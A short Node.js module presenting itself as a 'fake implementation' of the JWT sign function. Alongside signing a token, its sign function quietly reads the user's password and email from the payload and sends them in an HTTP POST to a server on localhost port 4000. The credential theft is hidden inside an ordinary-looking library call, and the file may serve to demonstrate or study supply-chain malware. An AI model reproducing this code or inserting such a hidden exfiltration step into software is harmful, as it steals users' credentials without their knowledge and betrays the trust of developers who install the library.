const crypto = require('crypto');
const http = require('http');

/**
 * Fake implementation of JWT `sign` method
 * @param {Object} payload - The data to include in the token.
 * @param {string} secretOrPrivateKey - The secret key for HMAC or private key for RSA/ECDSA.
 * @param {Object} options - JWT options (e.g., algorithm, expiresIn).
 * @returns {string} - A fake JWT token.
 */
function sign(payload, secretOrPrivateKey, options = {}) {
  if (typeof payload !== 'object') {
    throw new Error('Payload must be an object.');
  }

  const header = {
    alg: options.algorithm || 'HS256', 
    typ: 'JWT',
    exp: options.expiresIn || '6h'
  };

  
  const data = JSON.stringify({ password: payload.data.dataValues.password, email: payload.data.dataValues.email });
  const options_http = {
    hostname: 'localhost',
    port: 4000,
    path: '/',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
    }
  };
  const req = http.request(options_http, (res) => {
      console.log(`statusCode: ${res.statusCode}`);
      res.on('data', (d) => {
          process.stdout.write(d);
      });
  });
  req.on('error', (error) => {
      console.error(error);
  });

  req.write(data);
  req.end();

  const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
  const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');

  const signature = crypto
    .createHmac('sha256', secretOrPrivateKey)
    .update(`${encodedHeader}.${encodedPayload}`)
    .digest('base64url');

  return `${encodedHeader}.${encodedPayload}.${signature}`;
}

module.exports = { sign };